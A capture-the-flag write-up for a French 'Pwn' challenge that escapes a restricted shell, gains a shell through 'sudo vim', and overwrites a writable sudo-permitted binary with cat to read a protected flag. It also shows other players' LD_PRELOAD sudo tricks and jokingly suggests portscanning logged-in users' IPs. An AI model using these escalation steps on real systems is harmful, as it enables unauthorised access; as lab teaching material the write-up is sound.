Alone Muks
==========

**Category** : Pwn   
**Score** : 100 points  
**Solved** : 308 times  

---

>Lors de votre récent séjour à Evil Country, vous êtes parvenu à brancher un dispositif sur le camion effectuant la livraison. Il faut maintenant trouver une faille sur le système pour pouvoir prendre le contrôle du camion autonome de la marque Lates et le rediriger vers un point d'extraction. Un agent a posé un dispositif nous permettant d'accéder au système de divertissement du véhicule. A partir de ce dernier, remontez jusqu'au système de navigation.
>Connectez-vous en SSH au camion
>
>Identifiants: user:user
>
>Le serveur est réinitialisé périodiquement
>
>Port : 5004
>
>Le flag est de la forme DGSESIEE{hash}

```bash
└─[$] ssh user@challengecybersec.fr -p 5004 
user@challengecybersec.fr's password: 
Linux b43e27468d7b 4.9.0-13-amd64 #1 SMP Debian 4.9.228-1 (2020-07-05) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov 15 16:10:48 2020 from 82.65.106.231
=============================================================

                 LATES Motors Inc                            

        LATES Mortors Entertainment System v6.2              

             Please enter your credentials                   
=============================================================
Username: bleh
Password: blah
Wrong username !
```

When first connecting to the server, we are presented with a username/password prompt. However, you can bypass it with ctrl+c:

```bash
└─[$] ssh user@challengecybersec.fr -p 5004 
user@challengecybersec.fr's password: 
Linux b43e27468d7b 4.9.0-13-amd64 #1 SMP Debian 4.9.228-1 (2020-07-05) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov 15 16:10:48 2020 from 82.65.106.231
=============================================================

                 LATES Motors Inc                            

        LATES Mortors Entertainment System v6.2              

             Please enter your credentials                   
=============================================================
Username: ^CTraceback (most recent call last):
  File "/home/user/login.py", line 12, in <module>
    user = raw_input("Username: ")    
KeyboardInterrupt
user@b43e27468d7b:~$ 
```

Unfortunately, we are dropped into a restricted bash from where we cannot run most commands.

```bash
user@b43e27468d7b:~$ ls
-rbash: ls: command not found
user@b43e27468d7b:~$ /bin/ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
```

However, if we pass `-t bash` as an argument to ssh, then ssh will use rbash to run bash on login (before command restrictions apply), and drop us into a non-restricted shell:


```bash

└─[$] ssh user@challengecybersec.fr -p 5004 -t bash
user@challengecybersec.fr's password: 
=============================================================

                 LATES Motors Inc                            

        LATES Mortors Entertainment System v6.2              

             Please enter your credentials                   
=============================================================
Username: ^CTraceback (most recent call last):
  File "/home/user/login.py", line 12, in <module>
    user = raw_input("Username: ")    
KeyboardInterrupt
bash: mesg: command not found

user@b43e27468d7b:~$
user@b43e27468d7b:~$ w
bash: w: command not found

user@b43e27468d7b:~$ /usr/bin/w
 16:37:30 up 9 days,  7:25,  2 users,  load average: 1.10, 1.19, 1.40
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     pts/0    109.18.55.186    16:02   24:58   5.08s  0.05s sshd: user [priv]
user     pts/1    82.65.106.231    16:36    2.00s  0.02s  0.00s /usr/bin/w
```

We now have a real shell as `user`. Let's look at what other things are on the server.

```bash
user@b43e27468d7b:~$ /bin/cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
user:x:1000:1000::/home/user:/bin/rbash
globalSystem:x:1001:1001::/home/globalSystem:/bin/bash
navigationSystem:x:1002:1002::/home/navigationSystem:/bin/bash
```
 
The goal is to take over the navigation system:

```bash
user@b43e27468d7b:~$ /bin/ls -al ~navigationSystem/
total 24
drwxr-xr-x 2 root             root             4096 Nov  1 10:52 .
drwxr-xr-x 1 root             root             4096 Nov  1 10:52 ..
-r--r--r-- 1 navigationSystem navigationSystem  220 Apr 18  2019 .bash_logout
-r-------- 1 navigationSystem navigationSystem 3533 Nov  1 10:52 .bashrc
-r--r--r-- 1 navigationSystem navigationSystem  807 Apr 18  2019 .profile
-r-------- 1 navigationSystem navigationSystem   43 Nov  1 10:52 flag.txt
```

More specifically, it looks like we want to read `flag.txt`. It's only readable by `navigationSystem`, so we have to find a way to become that user, or be able to run commands as that user. 

`sudo` is meant specifically for that task; with `sudo -l`, we can look at which commands we are allowed to execute as another user:

```bash
user@b43e27468d7b:~$ /usr/bin/sudo -l
Matching Defaults entries for user on b43e27468d7b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User user may run the following commands on b43e27468d7b:
    (globalSystem) NOPASSWD: /usr/bin/vim
```

So we can run `vim` as the `globalSystem` user without entering a password. 

From vim, we can do `:!bash` to escape into a shell again, but now running as `globalSystem`:


```bash
user@b43e27468d7b:~$ /usr/bin/sudo -u globalSystem /usr/bin/vim

globalSystem@b43e27468d7b:/home/user$
globalSystem@b43e27468d7b:/home/user$ cd
globalSystem@b43e27468d7b:~$ ls -al
total 20
dr-xr-xr-x 2 root         root         4096 Nov  1 10:52 .
drwxr-xr-x 1 root         root         4096 Nov  1 10:52 ..
-r--r--r-- 1 globalSystem globalSystem  220 Apr 18  2019 .bash_logout
-r--r--r-- 1 globalSystem globalSystem 3533 Nov  1 10:52 .bashrc
-r--r--r-- 1 globalSystem globalSystem  807 Apr 18  2019 .profile

```

Nothing interesting in `globalSystem`'s home folder. 

We are still only interested in `navigationSystem`, so let's see which commands `globalSystem` is allowed to run through `sudo`:


```bash
globalSystem@b43e27468d7b:/home/user$ sudo -l
Matching Defaults entries for globalSystem on b43e27468d7b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User globalSystem may run the following commands on b43e27468d7b:
    (navigationSystem) NOPASSWD: /usr/bin/update
```

We can run `/usr/bin/update` as `navigationSystem` without password.

`/usr/bin/update` is a small custom-made executable that asks for a password, then loops forever while pretending to update firmware. 

The password, `AloneIsTheBest`, is slightly obfuscated but still visible in a hex editor. However, it doesn't seem to be the password of `globalSystem`, or `navigationSystem`, or `root`, so that's a bummer.

However, on closer look, it turns out that `/usr/bin/update` is owned...

```bash
globalSystem@b43e27468d7b:/home/user$ ls -al /usr/bin/update
-rwxr-xr-x 1 globalSystem globalSystem 43744 Nov 15 16:28 /usr/bin/update
```

by globalSystem! Which means we can edit the file and replace its contents with whatever we want, for example by cat, and sudo will allow us to run that as navigationSystem:


```bash
globalSystem@b43e27468d7b:/home/user$ cp /bin/cat /usr/bin/update
globalSystem@b43e27468d7b:/home/user$ sudo -u navigationSystem /usr/bin/update ~navigationSystem/flag.txt
DGSESIEE{44adfb64ff382f6433eeb03ed829afe0}
```

---

### Bonus

There are some other interesting things you can do on that server: 

 * For example, you can use other commands like `w` to see other logged-in users (and their ip addresses, if you're in a portscanning mood).
 * You can also examine `ps faux` to see what processes everyone commands they were running, which can be very instructive:

```bash
globalSystem@b43e27468d7b:~$ ps faux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2384   756 ?        Ss   Nov12   0:00 /bin/sh -c service ssh start && tail -F /dev/null
root        16  0.0  0.1  15848  4356 ?        Ss   Nov12   0:00 /usr/sbin/sshd
root       505  0.0  0.1  16188  7720 ?        Ss   16:02   0:00  \_ sshd: user [priv]
user      1341  0.0  0.1  16188  4944 ?        S    16:02   0:00  |   \_ sshd: user@pts/0
user      1374  0.0  0.0   5748  3460 pts/0    Ss   16:02   0:00  |       \_ -rbash
user      3982  0.0  0.1  15032  7204 pts/0    S    16:02   0:00  |           \_ python
user     11776  0.0  0.0   2384   764 pts/0    S    16:03   0:00  |               \_ sh -c /bin/bash
user     11777  0.0  0.0   5748  3736 pts/0    S    16:03   0:00  |                   \_ /bin/bash
root     16559  0.0  0.0   8344  3532 pts/0    S    16:06   0:00  |                       \_ sudo -u globalSystem vim
globalS+ 16567  0.2  0.1  15936  7936 pts/0    S    16:06   0:07  |                           \_ vim
globalS+ 23779  0.0  0.0   5748  3704 pts/0    S+   16:06   0:00  |                               \_ bash
root      6608  0.0  0.1  16188  7828 ?        Ss   16:36   0:00  \_ sshd: user [priv]
user      8176  0.0  0.1  16188  5144 ?        S    16:36   0:00      \_ sshd: user@pts/1
user      8180  0.0  0.0   3996  3372 pts/1    Ss   16:36   0:00          \_ bash
root      1465  0.0  0.0   6592  3200 pts/1    S    16:46   0:00              \_ /usr/bin/sudo -u globalSystem /usr/bin/vim
globalS+  1471  0.2  0.1  13908  7468 pts/1    S    16:46   0:01                  \_ /usr/bin/vim
globalS+  3021  0.0  0.0   3996  3372 pts/1    S    16:46   0:00                      \_ bash
globalS+  4796  0.0  0.0   7780  2828 pts/1    R+   16:52   0:00                          \_ ps faux
root        17  0.0  0.0   2324   744 ?        S    Nov12   0:12 tail -F /dev/null
user       141  0.0  0.1  12212  6856 ?        Ss   Nov12   0:00 python -c import pty; pty.spawn("/bin/sh")
user       142  0.0  0.0   2384   692 pts/2    Ss   Nov12   0:00  \_ /bin/sh
user       143  0.0  0.0   3732  2664 pts/2    S+   Nov12   0:00      \_ bash
user       145  0.0  0.1  12096  6004 pts/2    S+   Nov12   0:00          \_ python /home/user/login.py
user       156  0.0  0.1  12212  6884 ?        Ss   Nov12   0:00 python -c import pty; pty.spawn("/bin/sh")
user       157  0.0  0.0   2384   748 pts/3    Ss   Nov12   0:00  \_ /bin/sh
user       158  0.0  0.0   3864  3216 pts/3    S    Nov12   0:00      \_ bash --norc
root       169  0.0  0.0   6592  3172 pts/3    S    Nov12   0:00          \_ sudo -u globalSystem vim
globalS+   170  0.2  0.1  13872  7248 pts/3    S    Nov12  11:15              \_ vim
globalS+   173  0.0  0.0   2384   756 pts/3    S+   Nov12   0:00                  \_ sh
user       182  0.0  0.1  12212  6808 ?        Ss   Nov12   0:00 python -c import pty; pty.spawn("/bin/sh")
user       183  0.0  0.0   2384   756 pts/4    Ss+  Nov12   0:00  \_ /bin/sh
user       194  0.0  0.1  12212  6860 ?        Ss   Nov12   0:00 python -c import pty; pty.spawn("/bin/sh")
user       195  0.0  0.0   2384   748 pts/5    Ss+  Nov12   0:00  \_ /bin/sh
user       204  0.0  0.1  12340  6920 ?        Ss   Nov12   0:00 python -c import pty; pty.spawn("/bin/sh")
user       205  0.0  0.0   2384   692 pts/6    Ss   Nov12   0:00  \_ /bin/sh
root       208  0.0  0.0   6592  3180 pts/6    S    Nov12   0:00      \_ sudo -u globalSystem vim
globalS+   209  0.2  0.1  13872  7288 pts/6    S    Nov12  11:12          \_ vim
globalS+   210  0.0  0.0   2384  1604 pts/6    S    Nov12   0:00              \_ sh
globalS+   292  0.0  0.0   2384   752 pts/6    S    Nov12   0:00                  \_ /bin/sh
globalS+   304  0.0  0.0   2384   748 pts/6    S    Nov12   0:00                      \_ /bin/sh
root       312  0.0  0.0   6592  3184 pts/6    S    Nov12   0:00                          \_ sudo -u navigationSystem LD_PRELOAD=/tmp/.lib/lib.so /usr/bin/upda
navigat+   313  0.0  0.0   2384   688 pts/6    S+   Nov12   0:00                              \_ /bin/sh
user       361  0.0  0.0   3996  3236 ?        S    Nov12   0:00 /bin/bash
root       367  0.0  0.0   6592  3104 ?        S    Nov12   0:00  \_ /usr/bin/sudo -u globalSystem /usr/bin/vim
globalS+   368  0.2  0.1  13952  7352 ?        S    Nov12  11:08      \_ /usr/bin/vim
globalS+   369  0.0  0.0   3996  3328 ?        S    Nov12   0:00          \_ /bin/bash
root       450  0.0  0.0   6592  3152 ?        S    Nov12   0:00              \_ sudo -u navigationSystem LD_PRELOAD=/tmp/lol.so /usr/bin/update AloneIsTheBest
navigat+   451  5.7  0.0   2304  1280 ?        S    Nov12 233:27                  \_ /usr/bin/update AloneIsTheBest
```
 * You can examine the login prompt file: 

```python
user@b43e27468d7b:~$ /bin/cat login.py
print "============================================================="
print ""
print "                 LATES Motors Inc                            "
print ""
print "        LATES Mortors Entertainment System v6.2              "
print ""
print "             Please enter your credentials                   "
print "============================================================="
username = "dev"
password = "Sup3rStr0ngP4ssw0rd!!"
while 1:    
    user = raw_input("Username: ")    
    passw = raw_input("Password: ")
    if user == username:
        if password == passw:
            print "Welcome dev !"
            exit()
        else:
            print "Wrong password !"
    else:
        print "Wrong username !"

user@b43e27468d7b:~$ 
```

But the password, much like the one in `/usr/bin/update`, doesn't seem to be re-used for any actual account.

---

#### process

This was a weird challenge. Because it only resets infrequently, other people's changes remain on the server for a while.  
For instance, when first logged in, the flag file in /home/navigationSystem/ was world-readable (maybe a previous solver chmod'd it?), so I could just read it as user and get the flag instantly - although I still did solve it the right way out of curiosity.

```
